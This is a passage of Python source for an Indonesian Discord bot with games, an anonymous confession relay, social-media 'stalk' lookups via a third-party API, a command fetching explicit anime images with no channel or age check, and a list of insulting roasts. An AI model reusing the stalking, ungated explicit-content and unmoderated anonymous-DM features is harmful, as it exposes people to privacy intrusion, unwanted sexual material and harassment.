async def buyy(ctx, item_name: str):
    """Membeli item dari toko jika pemain memiliki cukup koin."""
    player = get_player(ctx)
    
    if item_name not in shop_items:
        await ctx.send("Item tidak tersedia di toko.")
        return

    item = shop_items[item_name]
    if player["coins"] >= item["price"]:
        player["coins"] -= item["price"]
        player["items"].append(item_name)  # Menambahkan item ke inventaris pemain
        embed = discord.Embed(title="Pembelian Berhasil", color=discord.Color.green())
        embed.add_field(name="Item", value=item_name, inline=False)
        embed.add_field(name="Sisa Koin", value=str(player["coins"]), inline=False)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="Koin Tidak Cukup", color=discord.Color.red())
        embed.add_field(name="Status", value="Koin kamu tidak cukup untuk membeli item ini.", inline=False)
        await ctx.send(embed=embed)
        
 # menu 1vs1
@bot.command()
async def byone(ctx):
    menu_text = """
**✧━━━━━━[ *Menu* ]━━━━━━━✧**                      
                                    
 1. `/mulaii`
 2. `/score`
 3. `/resett`
 4. `/shop`
 5. `/buyy`
 
**✧━━━━[ *Thank You* ]━━━━━━✧**
`Pesan otomatis jangan di replay`
"""

    embed = discord.Embed(
        description=menu_text,
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1364441222806114354/IMG-20250401-WA0094.png?ex=6809ae69&is=68085ce9&hm=2fa68ac7ada7e285d41e6bb721ad15076dcea6dd05d7dea2656a23d7408e6047&")  # Ganti URL ini kalo kamu mau foto lain
    embed.set_footer(text="Powered By Antartica-Server")

    await ctx.send(embed=embed)

# balapan
race_waiting = {}
players_data = {}

def add_coins(user_id, amount):
    players_data.setdefault(user_id, {"coins": 0})
    players_data[user_id]["coins"] += amount

def get_coins(user_id):
    return players_data.get(user_id, {}).get("coins", 0)

@bot.command()
async def race(ctx):
    if ctx.channel.id in race_waiting:
        await ctx.send("Balapan udah dibuat di sini, tunggu selesai.")
        return

    race_waiting[ctx.channel.id] = [ctx.author.id]
    msg = await ctx.send(embed=discord.Embed(title="🏍️ Balapan Dibuat!", description=f"{ctx.author.mention} menunggu lawan... (ketik `!join`)", color=0x00ff00))
    
    await asyncio.sleep(10)
    if len(race_waiting[ctx.channel.id]) == 1:
        race_waiting[ctx.channel.id].append("BOT")
        await msg.edit(embed=discord.Embed(title="🏍️ Lawan BOT!", description=f"{ctx.author.mention} VS **BOT**. Ketik `!go` untuk mulai!", color=0xff9900))

@bot.command()
async def join(ctx):
    if ctx.channel.id not in race_waiting:
        await ctx.send("Belum ada balapan. Ketik `/race` dulu.")
        return

    if len(race_waiting[ctx.channel.id]) >= 2:
        await ctx.send("Balapan sudah penuh.")
        return

    race_waiting[ctx.channel.id].append(ctx.author.id)
    await ctx.send(embed=discord.Embed(title="🏍️ Siap Balapan!", description="Ketik `/mulai` untuk mulai!", color=0x00ffff))

@bot.command()
async def mulai(ctx):
    if ctx.channel.id not in race_waiting:
        await ctx.send("Tidak ada balapan yang aktif.")
        return

    players = race_waiting[ctx.channel.id]
    if ctx.author.id != players[0]:
        await ctx.send("Hanya host yang bisa mulai balapan.")
        return

    p1 = players[0]
    p2 = players[1]

    def get_name(p):
        return ctx.guild.get_member(p).display_name if p != "BOT" else "BOT"

    p1_name = get_name(p1)
    p2_name = get_name(p2)

    msg = await ctx.send(embed=discord.Embed(title="🏁 Persiapan Balapan", description=f"{p1_name} vs {p2_name}\n🔴", color=0xff0000))
    await asyncio.sleep(1)
    await msg.edit(embed=discord.Embed(title="🏁 Persiapan Balapan", description=f"{p1_name} vs {p2_name}\n🟡", color=0xffcc00))
    await asyncio.sleep(1)
    await msg.edit(embed=discord.Embed(title="🏁 Persiapan Balapan", description=f"{p1_name} vs {p2_name}\n🟢", color=0x33ff33))
    await asyncio.sleep(1)

    posisi = ["🏍️", "🏍️"]
    for _ in range(5):
        posisi[0] += " " * random.randint(1, 3)
        posisi[1] += " " * random.randint(1, 3)
        des = f"{p1_name}:\n{posisi[0]}\n\n{p2_name}:\n{posisi[1]}"
        await msg.edit(embed=discord.Embed(title="🏍️ Balapan Dimulai!", description=des, color=0x00ffff))
        await asyncio.sleep(1)

    winner = p1 if len(posisi[0]) > len(posisi[1]) else p2
    winner_name = get_name(winner)
    if winner != "BOT":
        add_coins(winner, 30)

    await msg.edit(embed=discord.Embed(
        title="🏆 Balapan Selesai!",
        description=f"**Pemenang:** {winner_name}!\n+30 coins!",
        color=0x00ff00
    ))

    del race_waiting[ctx.channel.id]
    
@bot.command()
async def koin(ctx):
    coins = get_coins(ctx.author.id)
    await ctx.send(embed=discord.Embed(title="Dompet", description=f"{ctx.author.mention} punya **{coins} coins**", color=0xf1c40f))
    
# menu balapan
@bot.command()
async def balapan(ctx):
    menu_text = """
**✧━━━━━━[ *Menu* ]━━━━━━━✧**                      
                                    
 1. `/race`
 2. `/join`
 3. `/mulai`
 4. `/koin`
 
**✧━━━━[ *Thank You* ]━━━━━━✧**
`Pesan otomatis jangan di replay`
"""

    embed = discord.Embed(
        description=menu_text,
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1364441222806114354/IMG-20250401-WA0094.png?ex=6809ae69&is=68085ce9&hm=2fa68ac7ada7e285d41e6bb721ad15076dcea6dd05d7dea2656a23d7408e6047&")  # Ganti URL ini kalo kamu mau foto lain
    embed.set_footer(text="Powered By Antartica-Server")

    await ctx.send(embed=embed)

#cekkhodam  
@bot.command()
async def cekkhodam(ctx, *, nama=None):
    if not nama:
        await ctx.send("Contoh: `.cekkhodam biyu`")
        return
        
    url = f"https://nusswebb.ptero.web.id/api/cekkhodam?nama={nama}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as res:
                data = await res.json()
                pesan = data.get("result", {}).get("message", "Tidak ada pesan dari khodam.")
                await ctx.send(pesan)
    except Exception as e:
        await ctx.send("Gagal ambil data khodam.")
        
DATA_PATH = "./database/hati.json"
os.makedirs(os.path.dirname(DATA_PATH), exist_ok=True)

def simpan_data(hati):
    with open(DATA_PATH, "w") as f:
        json.dump(hati, f)

def load_data():
    if not os.path.exists(DATA_PATH):
        return {
            "kenangan": ['senyuman pertama', 'tatapan terakhir'],
            "janji": ['gak akan ninggalin', 'selalu ada'],
            "harapan": {"status": "rapuh"},
            "rasa_sakit": 12980,
            "chat_terakhir": '..."aku butuh waktu buat sendiri..."',
            "masa_depan": None
        }
    with open(DATA_PATH, "r") as f:
        return json.load(f)

@bot.command()
async def galaujs(ctx):
    hati = load_data()
    try:
        if hati['rasa_sakit'] >= 10000 or hati['harapan']['status'] == 'palsu':
            raise Exception("EmotionalException: harapan tidak sesuai realita")
        if not hati['masa_depan']:
            raise Exception("FutureNotFound: rencana bersamanya tidak tersedia")

        await ctx.send("✅ Proses berhasil...\nTapi kenapa hati masih berat? Mungkin karena rindu tak pernah pamit saat pergi...")
    except Exception as err:
        await ctx.send(f"""❌ *Terjadi Kesalahan Batin*

*Error:* {err}

📂 *Isi Hati Saat Ini:*
- Kenangan: {len(hati['kenangan'])} file
- Janji: {len(hati['janji'])} draft
- Terakhir Dengar: "{hati['chat_terakhir']}"

💡 *Solusi:* `.formatulanghati` — reset semuanya, mulai dari kamu.
""")
    finally:
        await ctx.send("🛑 Proses ditutup.\nNamun sayang... yang patah tak bisa kembali utuh hanya dengan script.")

@bot.command()
async def formatulanghati(ctx):
    hati = {
        "kenangan": [],
        "janji": [],
        "harapan": {"status": "optimis"},
        "rasa_sakit": 0,
        "chat_terakhir": 'Belum ada pesan yang bikin senyum-senyum sendiri',
        "masa_depan": "cerah, tenang, dan penuh harapan"
    }
    simpan_data(hati)

    motivasi = [
        'Hati yang terluka juga berhak bahagia.',
        'Gak semua yang pergi harus dikejar.',
        'Kadang kehilangan itu cara semesta bilang: "ini bukan buatmu".',
        'Hari ini kamu patah, besok kamu kuat.',
        'Senyum lagi, dunia belum selesai.'
    ]

    kutipan = random.choice(motivasi)

    await ctx.send(f"""✅ *Hati diformat ulang.*

📦 Kenangan: {len(hati['kenangan'])}
🔐 Janji: {len(hati['janji'])}
❤️ Harapan: {hati['harapan']['status']}

✨ {kutipan}
""")
    
#menu utama permainan          
@bot.command()
async def permainan(ctx):
    menu_text = """
**✧━━━━━━[ *Menu* ]━━━━━━━✧**
    
1. `/tebakgambar`
2. `/tebaksurah`
3. `/siapkahaku`
4. `/tebairik`
5. `/caklontong`
6. `/susunkata`
7. `/susunkata`
8. `/tebakbendera`
9. `/tebaklogo`
10. `/susunkalimat`
11. `/kuis`
12. `/tebakbom`
13. `/tictactoe`
14. `/byone`
15. `/balapan`
16. `/roast`
17. `/cekkhodam`
18. `/formatulanghati`
19. `/galaujs`
20. `/baskara`
21. `/menangkappolisi`
22. `/menfess <tag>` 
23. `/balasmenfess`
24. `/tolakmenfess`
25. `/stopmenfess`
   
**✧━━━━[ *Thank You* ]━━━━━━✧**
`Pesan otomatis jangan di replay`
"""

    embed = discord.Embed(
        description=menu_text,
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1362671538503024691/6642c429a34ce2c4fdbd17bf271e2b6c.jpg?ex=68033e43&is=6801ecc3&hm=174d0c310883f861f64378c4821838371c765fc6a5ece9fc34fdc6aaf0234dc1&")  # Ganti URL ini kalo kamu mau foto lain
    embed.set_footer(text="Powered By Apisiputzx")

    await ctx.send(embed=embed)
    
#confess
# database buat nyimpen sesi menfess
menfess_sessions = {}

@bot.command()
async def menfess(ctx, *, text=None):
    if ctx.guild is not None:
        await ctx.reply("Fitur hanya bisa di DM bot!")
        return
    session = next((v for v in menfess_sessions.values() if v['state'] == 'CHATTING' and ctx.author.id in [v['a'], v['b']]), None)
    if session:
        target_id = session['b'] if session['a'] == ctx.author.id else session['a']
        target_user = await bot.fetch_user(target_id)
        await target_user.send(f"📩 Pesan baru dari ???:\n\n{text}")
        await ctx.reply("Pesan diteruskan.")
        return

    if not text or '|' not in text:
        await ctx.reply("Format salah!\nGunakan: `!menfess nama|id_user|pesan`")
        return

    nama, user_id, pesan = text.split('|')
    try:
        user_id = int(user_id)
    except ValueError:
        await ctx.reply("ID user tidak valid!")
        return

    try:
        target_user = await bot.fetch_user(user_id)
    except:
        await ctx.reply("User tidak ditemukan.")
        return

    notif = f"Hi, ada menfess nih buat kamu!\n\nDari: {nama}\nPesan: {pesan}\n\nKetik:\n`!balasmenfess` untuk menerima\n`!tolakmenfess` untuk menolak\n\n_Pesan ini dikirim oleh bot._"
    await target_user.send(notif)

    menfess_sessions[ctx.author.id] = {
        'id': ctx.author.id,
        'a': ctx.author.id,
        'b': target_user.id,
        'state': 'WAITING',
    }
    await ctx.reply("Pesan berhasil dikirim ke target!")

@bot.command()
async def balasmenfess(ctx):
    session = next((v for v in menfess_sessions.values() if ctx.author.id in [v['a'], v['b']] and v['state'] == 'WAITING'), None)
    if not session:
        await ctx.reply("Tidak ada sesi menfess yang sedang menunggu.")
        return

    other_id = session['a']
    other_user = await bot.fetch_user(other_id)

    session['b'] = ctx.author.id
    session['state'] = 'CHATTING'
    menfess_sessions[session['id']] = session

    await other_user.send(f"_@{ctx.author.name} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini._\n\n*NOTE:* ketik `!stopmenfess` untuk berhenti.")
    await ctx.reply("Menfess diterima! Sekarang kamu bisa balas.")

@bot.command()
async def tolakmenfess(ctx):
    session = next((v for v in menfess_sessions.values() if ctx.author.id in [v['a'], v['b']]), None)
    if not session:
        await ctx.reply("Tidak ada sesi menfess.")
        return

    other_id = session['a']
    other_user = await bot.fetch_user(other_id)

    await other_user.send(f"_Maaf, {ctx.author.name} menolak menfess kamu._")
    await ctx.reply("Menfess berhasil ditolak.")

    del menfess_sessions[session['id']]

@bot.command()
async def stopmenfess(ctx):
    session = next((v for v in menfess_sessions.values() if ctx.author.id in [v['a'], v['b']]), None)
    if not session:
        await ctx.reply("Tidak ada sesi menfess.")
        return

    other_id = session['a'] if session['b'] == ctx.author.id else session['b']
    other_user = await bot.fetch_user(other_id)

    await other_user.send("_Sesi menfess telah dihentikan._")
    await ctx.reply("Sesi dihentikan.")

    del menfess_sessions[session['id']]
    
#menangkappolisi
@bot.command()
async def menangkappolisi(ctx):
    if not ctx.guild:
        return await ctx.send('Fitur ini hanya bisa dipakai di grup/server!')

    members = [member for member in ctx.guild.members if not member.bot]
    
    if len(members) < 5:
        return await ctx.send('Minimal 5 member di server untuk menjalankan game ini (karena ada role saksi)!')

    random.shuffle(members)
    polisi = members[0]
    pencuri = members[1]
    hakim = members[2]
    saksi = members[3]

    embed = discord.Embed(
        title="🚨 Roleplay Penangkapan Gagal!",
        description="Kejadian seru hari ini di kota Discord...",
        color=discord.Color.red()
    )
    embed.add_field(name="👮 Polisi", value=polisi.mention, inline=False)
    embed.add_field(name="🕵️ Pencuri", value=pencuri.mention, inline=False)
    embed.add_field(name="⚖️ Hakim", value=hakim.mention, inline=False)
    embed.add_field(name="🧑‍⚖️ Saksi", value=saksi.mention, inline=False)
    embed.add_field(
        name="Cerita",
        value=(
            "Polisi menangkap pencuri dan langsung menembaknya mati. "
            "Namun ternyata, polisi salah tangkap orang!\n\n"
            "Saksi yang melihat kejadian tersebut langsung melapor ke hakim.\n\n"
            "Hakim memutuskan untuk mengeksekusi polisi karena kesalahan fatal!\n\n"
            "⚰️ Polisi dieksekusi oleh hakim setelah laporan dari saksi."
        ),
        inline=False
    )
    embed.set_footer(text="Game Roleplay by Bot")

    await ctx.send(embed=embed)

#baskara    
@bot.command()
async def baskara(ctx):
    try:
        with open("./api/api-baskara.json", "r") as f:
            data = json.load(f)

        kata_random = random.choice(data)

        embed = discord.Embed(
            title="Kata-kata untukmu!",
            description=f"*{kata_random}*",
            color=discord.Color.purple()
        )
        embed.set_footer(text="Powered by Baskara Api")

        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Gagal ambil kata: {e}")
    
#stalker
@bot.command()
async def stalker(ctx):
    menu_text = """
**✧━━━━━━[ *Menu* ]━━━━━━━✧**
    
1. `/igstalk`
2. `/tstlak`
3. `/twitstalk`
4. `/ytstalk`
5. `/gitstalk`
  
**✧━━━━[ *Thank You* ]━━━━━━✧**
`⚠️ Data tidak 100% valid ⚠️`
"""

    embed = discord.Embed(
        description=menu_text,
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1362671538503024691/6642c429a34ce2c4fdbd17bf271e2b6c.jpg?ex=68033e43&is=6801ecc3&hm=174d0c310883f861f64378c4821838371c765fc6a5ece9fc34fdc6aaf0234dc1&")  # Ganti URL ini kalo kamu mau foto lain
    embed.set_footer(text="Powered By Apisiputzx")

    await ctx.send(embed=embed)
 
#Sistem tstalk
def safe_get(data, key, default='-'):
    return data.get(key, default)

# fungsi buat bikin embed
def create_embed(platform, data):
    embed = discord.Embed(
        title=f"{platform}: @{safe_get(data, 'username')}",
        description=f"**{safe_get(data, 'full_name')}**\n\n*{safe_get(data, 'bio')}*",
        color=discord.Color.purple()
    )
    embed.set_thumbnail(url=safe_get(data, 'profile_pic'))
    embed.add_field(name="Followers", value=f"{safe_get(data, 'followers'):,}" if isinstance(safe_get(data, 'followers'), int) else "-", inline=True)
    embed.add_field(name="Following", value=f"{safe_get(data, 'following'):,}" if isinstance(safe_get(data, 'following'), int) else "-", inline=True)
    embed.add_field(name="Posts", value=f"{safe_get(data, 'posts'):,}" if isinstance(safe_get(data, 'posts'), int) else "-", inline=True)
    embed.add_field(name="Privasi", value="🔒 Privat" if safe_get(data, 'is_private') else "🔓 Publik", inline=True)
    embed.add_field(name="Verifikasi", value="✅ Verified" if safe_get(data, 'is_verified') else "❌ Belum", inline=True)
    embed.set_footer(
        text="Powered By Siputzxr",
        icon_url="https://cdn.discordapp.com/attachments/1350859899407437824/1362369862785044602/6642c429a34ce2c4fdbd17bf271e2b6c.jpg"
    )
    return embed

@bot.command()
async def tstalk(ctx, username: str):
    await ctx.defer()
    try:
        username = username.lstrip('@')
        api_url = f"https://api.siputzx.my.id/api/stalk/tiktok?username={username}"
        res = requests.get(api_url)
        if res.status_code != 200:
            return await ctx.reply("gagal dapetin dataa... username salah atau akun private")
        data = res.json()
        await ctx.send(embed=create_embed("TikTok", data))
    except Exception as e:
        await ctx.reply(f"ada error sayangg: `{e}`")

@bot.command()
async def twitstalk(ctx, username: str):
    await ctx.defer()
    try:
        username = username.lstrip('@')
        api_url = f"https://api.siputzx.my.id/api/stalk/twitter?user={username}"
        res = requests.get(api_url)
        if res.status_code != 200:
            return await ctx.reply("gagal dapetin dataa... username salah atau akun private")
        data = res.json()
        await ctx.send(embed=create_embed("Twitter", data))
    except Exception as e:
        await ctx.reply(f"ada error sayangg: `{e}`")

@bot.command()
async def ytstalk(ctx, username: str):
    await ctx.defer()
    try:
        username = username.lstrip('@')
        api_url = f"https://api.siputzx.my.id/api/stalk/youtube?username={username}"  # fix typo hhttps
        res = requests.get(api_url)
        if res.status_code != 200:
            return await ctx.reply("gagal dapetin dataa... username salah atau akun private")
        data = res.json()
        await ctx.send(embed=create_embed("YouTube", data))
    except Exception as e:
        await ctx.reply(f"ada error sayangg: `{e}`")

@bot.command()
async def gitstalk(ctx, username: str):
    await ctx.defer()
    try:
        username = username.lstrip('@')
        api_url = f"https://api.siputzx.my.id/api/stalk/github?user={username}"
        res = requests.get(api_url)
        if res.status_code != 200:
            return await ctx.reply("gagal dapetin dataa... username salah atau akun private")
        data = res.json()
        await ctx.send(embed=create_embed("GitHub", data))
    except Exception as e:
        await ctx.reply(f"ada error sayangg: `{e}`")
        
#mediafire
@bot.command()
async def mediafire(ctx, url_mediafire: str):
    # Mengganti URL pada endpoint dengan URL mediafire yang diberikan
    url = f"https://api.siputzx.my.id/api/d/mediafire?url={url_mediafire}"
    response = requests.get(url)

    # Mengecek apakah response berhasil
    if response.status_code == 200:
        data = response.json()
        
        # Mengecek apakah data tersedia dalam API response
        if 'size' in data:
            size = data['size']
            filename = data['filename']
            file_url = data['url']
            
            # Membuat embed untuk menampilkan data
            embed = discord.Embed(
                title=f'File: {filename}',
                description=f'File tersedia di: [Klik disini]({file_url})',
                color=discord.Color.blue()
            )
            embed.add_field(name="Ukuran File", value=size, inline=False)
            await ctx.send(embed=embed)
        else:
            await ctx.send("Gagal mengambil data dari Mediafire. Coba lagi.")
    else:
        await ctx.send("Terjadi kesalahan saat mengakses API.")
                
#downloader
@bot.command()
async def downloader(ctx):
    menu_text = """
**✧━━━━━━[ *Menu* ]━━━━━━━✧**
    
1. `/tiktok <url>`
2. `/videy down <url>`
3. `/videy up <replay video>`
4. `/brat <teks>`
5. `/customtext <text> <font v1.ttf - v19.ttf>`
6. `/mediafire <url>
  
**✧━━━━━[ *Thank You* ]━━━━━✧**
`Dikirim otomatis oleh bot`
"""

    embed = discord.Embed(
        description=menu_text,
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1364442981251158045/34cb34d66aecd640718bbb44c2ca2dee.jpg?ex=6809b00c&is=68085e8c&hm=dbc07caaddc46049c5d45880decbd04ba7e28b4dc5531c84af1426a95702725b&")  # Ganti URL ini kalo kamu mau foto lain
    embed.set_footer(text="Powered By Google Cloud")

    await ctx.send(embed=embed)
    
# clear chat
OWNER_ROLE_NAME = 'Owner'

@bot.command()
async def clearchat(ctx):
    # Cek apakah user yang memanggil command memiliki role Owner
    if any(role.name == OWNER_ROLE_NAME for role in ctx.author.roles):
        # Pastikan bot memiliki izin untuk menghapus pesan
        if ctx.author.guild.me.guild_permissions.manage_messages:
            # Menghapus semua pesan di channel ini
            await ctx.channel.purge(limit=None)  # Hapus semua pesan
            await ctx.send('Chat cleared!', delete_after=3)  # Mengirim pesan notifikasi dan menghapusnya setelah 3 detik
        else:
            await ctx.send('I do not have permission to manage messages!', delete_after=3)
    else:
        await ctx.send('You do not have permission to use this command!', delete_after=3)

#sistem brat
@bot.command()
async def brat(ctx, *, text: str = None):
    if not text:
        await ctx.reply("Contoh: `!brat andai dia balik`")
        return

    await ctx.message.add_reaction("🎀")

    url = f"https://api.ownblox.biz.id/api/brat?text={text}"

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as res:
            if 'image' not in res.headers.get('Content-Type', ''):
                raw_text = await res.text()
                await ctx.send("API tidak mengembalikan gambar. Berikut respons:\n" + raw_text)
                return

            image_data = await res.read()
            image_file = discord.File(io.BytesIO(image_data), filename="brat_sticker.webp")
            await ctx.send(file=image_file)
# sistem
data_path = "./database/first_join.json"
config_path = "./database/channel_config.json"
os.makedirs(os.path.dirname(data_path), exist_ok=True)

@bot.command()
async def welcome(ctx):
    """Simulasi user baru join + reset dari database"""
    await ctx.send("**Mengirim ulang welcome message...**")

    # hapus dulu dari database
    with open(data_path, 'r') as f:
        first_join = json.load(f)

    if str(ctx.author.id) in first_join:
        first_join.remove(str(ctx.author.id))

    with open(data_path, 'w') as f:
        json.dump(first_join, f, indent=2)

    # panggil ulang event
    await on_member_join(ctx.author)

@bot.event
async def on_member_join(member):
    with open(data_path, 'r') as f:
        first_join = json.load(f)

    with open(config_path, 'r') as f:
        channel_config = json.load(f)

    if str(member.id) in first_join:
        return

    hour = datetime.now().hour
    greeting = (
        "☀️ Selamat pagi" if 4 <= hour < 10 else
        "🌤️ Selamat siang" if 10 <= hour < 15 else
        "🌇 Selamat sore" if 15 <= hour < 18 else
        "🌙 Selamat malam"
    )

    embed = discord.Embed(
        title=f"Halo {member.name}!",
        description=f"{greeting}, {member.mention}\nApa kabar hari ini? Semoga harimu menyenangkan ya! ✨",
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
    embed.set_footer(text=f"Selamat datang di server {member.guild.name}")
    embed.timestamp = datetime.now(timezone.utc)

    # tombol rules & menu
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="📜 Rules Server", url="https://discord.gg/QBXgJE6STf"))
    view.add_item(discord.ui.Button(label="⚙️ Menu Bot", url="https://discord.gg/KZFbtT5DnQ"))

    channel_id = channel_config.get(str(member.guild.id))
    channel = bot.get_channel(channel_id) if channel_id else member.guild.system_channel

    if channel:
        await channel.send(embed=embed, view=view)

    first_join.append(str(member.id))
    with open(data_path, 'w') as f:
        json.dump(first_join, f, indent=2)

@bot.command(name="setid")
@commands.has_role("Owner")
async def set_welcome_channel(ctx, channel_id: int):
    with open(config_path, 'r') as f:
        config = json.load(f)

    try:
        channel = await bot.fetch_channel(channel_id)
    except:
        return await ctx.send("ID channel tidak valid atau bot tidak punya akses.")

    config[str(ctx.guild.id)] = channel_id
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=2)

    await ctx.send(f"Channel welcome berhasil diatur ke: {channel.mention}")

@set_welcome_channel.error
async def setid_error(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send("Hanya role **Owner** yang bisa pakai perintah ini.")
    else:
        await ctx.send("Terjadi kesalahan: pastikan ID channel valid.")

# --- Command list tag ---
@bot.command()
async def waifu(ctx, mode: str = 'sfw', tag: str = 'waifu'):
    try:
        if mode.lower() not in ['sfw', 'nsfw']:
            return await ctx.send("Mode cuma bisa `sfw` atau `nsfw` ya sayangg~")

        url = f'https://fastrestapis.fasturl.cloud/sfwnsfw/anime?type={mode}&tag={tag}'

        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return await ctx.send(f'Tag `{tag}` ga ketemu sayangg~ coba tag lain yaa~')

                img_url = str(resp.url)

                embed = discord.Embed(
                    title=f"{tag.capitalize()} ({mode.upper()})",
                    description="Nihhh buat kamuuu yang butuh hiburan hehe~",
                    color=discord.Color.random(),
                    timestamp=ctx.message.created_at
                )
                embed.set_image(url=img_url)
                embed.set_footer(text=f"Diminta oleh {ctx.author.name}", icon_url=ctx.author.display_avatar.url)

                await ctx.send(embed=embed)

    except Exception as e:
        print(e)
        await ctx.send('Lagi error bang, coba lagi nanti yaa~')

# --- Command list tag ---
@bot.command()
async def listtag(ctx):
    try:
        sfw_tags = [
            'waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo',
            'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave',
            'highfive', 'handhold'
        ]
        nsfw_tags = [
            'waifu', 'neko', 'trap', 'blowjob', 'oppai', 'hentai', 'boobs', 'cum', 'ero',
            'femdom', 'masturbation', 'pussy', 'orgy', 'ass', 'bdsm', 'yuri'
        ]

        embed = discord.Embed(
            title="Daftar Tag Waifu API",
            description="Pilih tag sesuai seleramu ya sayanggg~",
            color=discord.Color.fuchsia()
        )
        embed.add_field(name="SFW Tags", value=", ".join(sfw_tags), inline=False)
        embed.add_field(name="NSFW Tags", value=", ".join(nsfw_tags), inline=False)
        embed.set_footer(text=f"Diminta oleh {ctx.author.name}", icon_url=ctx.author.display_avatar.url)

        await ctx.send(embed=embed)

    except Exception as e:
        print(e)
        await ctx.send('Gagal ngambil daftar tag, coba lagi yaa sayangg~')
        
@bot.command()
async def novel(ctx, subcommand=None, *argsSub):
    if not subcommand:
        await ctx.reply("Contoh:\n.saku search takane no hana\n.saku info <link>\n.saku baca <link>")
        return

    argsSub = list(argsSub)

    if subcommand == 'search':
        keyword = ' '.join(argsSub)
        if not keyword:
            await ctx.reply("Masukkan judul yang ingin dicari.\nContoh: .saku search overlord")
            return
        try:
            headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://sakuranovel.id',
                'referer': 'https://sakuranovel.id',
                'user-agent': 'Mozilla/5.0',
                'x-requested-with': 'XMLHttpRequest'
            }
            response = requests.post(
                'https://sakuranovel.id/wp-admin/admin-ajax.php',
                data=f'action=data_fetch&keyword={keyword}',
                headers=headers
            )
            soup = BeautifulSoup(response.text, 'html.parser')
            results = soup.select('.searchbox')
            if not results:
                await ctx.reply("Novel tidak ditemukan.")
                return
            texts = ["**Hasil Pencarian:**\n"]
            for el in results[:10]:
                title = el.find('a')['title']
                link = el.find('a')['href']
                type_tags = [t.text.strip() for t in el.select('.type')]
                status = el.select_one('.status').text.strip() if el.select_one('.status') else 'Unknown'
                texts.append(f"• **{title}**\nStatus: {status}\nType: {', '.join(type_tags)}\nLink: {link}\n")
            await ctx.reply('\n'.join(texts))
        except Exception as e:
            await ctx.reply(f"Gagal cari: {str(e)}")

#sistem utama waifu
@bot.command()
async def wibu(ctx):
    menu_text = """
**✧━━━━━━[ *Menu* ]━━━━━━━✧**                      
                                    
 1. `/waifu [mode] [tag]`
 2. `/listtag`
 3. `/anime [judul]t`
 4. `/novel`
 5. `/randomanime`
 
**✧━━━━[ *Thank You* ]━━━━━━✧**
`Pesan otomatis jangan di replay`
"""

    embed = discord.Embed(
        description=menu_text,
        color=discord.Color.blurple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1350859899407437824/1362671538503024691/6642c429a34ce2c4fdbd17bf271e2b6c.jpg?ex=68033e43&is=6801ecc3&hm=174d0c310883f861f64378c4821838371c765fc6a5ece9fc34fdc6aaf0234dc1&")  # Ganti URL ini kalo kamu mau foto lain
    embed.set_footer(text="Powered By Siputzx")

    await ctx.send(embed=embed)

# sistem anime
@bot.command()
async def randomanime(ctx):
    embed = discord.Embed(title="✨ Random Anime", color=discord.Color.purple())
    embed.set_image(url="https://pic.re/image")
    await ctx.send(embed=embed)
    
#roast
roast_list = [
    "`@user, kadang gue mikir, kamu tuh kayak sinyal 1 bar di tengah hutan—nggak berguna tapi selalu muncul pas gak dibutuhin.`",
    "`@user, lu tuh kayak charger 15 ribuan—bisa dipake, tapi bikin panas dan ngerusak semuanya.`",
    "`@user, kalau otak kamu dijual di marketplace, kemungkinan besar masuk kategori 'rusak parah, dijual kiloan'.`",
    "`@user, kamu kayak WiFi tetangga—kelihatan tapi nggak bisa dipake. Ngeselin banget!`",
    "`@user, kalau ngomong tuh kayak lagu remix—banyak noise tapi gak jelas maksudnya.`",
    "`@user, kamu itu bukan toxic sih, tapi lebih kayak limbah beracun yang seharusnya dikarantina 40 tahun.`",
    "`@user, gaya hidupmu tuh kayak skripsi anak semester 9—jalan di tempat, banyak alasan, hasil nol.`",
    "`@user, lu tuh kayak CAPTCHA yang gak bisa ditebak, cuma nyusahin orang doang.`",
    "`@user, kalau jadi karakter game, kamu tuh pasti NPC yang ngasih misi gagal dari awal.`",
    "`@user, jujur aja... tiap kamu buka mulut, IQ ruangan turun 10 poin.`",
    "`@user, muka kamu tuh kayak error 404—nggak ketemu solusinya, bikin stres.`",
    "`@user, kalau jadi hewan, kamu pasti masuk kategori hewan mitos, soalnya gak ada yang ngerti eksistensimu.`",
    "`@user, kamu tuh kayak alarm jam 5 pagi pas libur—gak penting, cuma ganggu tidur orang.`",
    "`@user, IQ kamu tuh kayak ping server merah—tinggi banget tapi gak berguna.`",
    "`@user, lu tuh kayak file corrupt—dibuka bikin kesel, dihapus sayang kuota.`",
    "`@user, kalau ada lomba jadi beban, lu pasti juara bertahan 5 tahun berturut-turut.`",
    "`@user, jokes kamu tuh kayak sinetron azab—maksa, basi, tapi tetep aja nongol.`",
    "`@user, ngomong sama lu tuh kayak ngisi CAPTCHA terus gagal, muter-muter gak jelas.`",
    "`@user, kalau ketawa lu direkam, bisa dipake buat usir tuyul.`",
    "`@user, gaya kamu tuh kayak intro YouTuber 2012—lebay, norak, dan pengen skip.`",
    "`@user, lu tuh kayak charger rusak—bisa nyambung tapi nyetrum perasaan orang.`",
    "`@user, setiap kamu muncul, vibes-nya kayak error di Windows—tiba-tiba, bikin panik, dan nyusahin.`",
    "`@user, kamu itu kayak sandi WiFi yang udah nggak aktif—masih diingat, tapi udah gak guna.`",
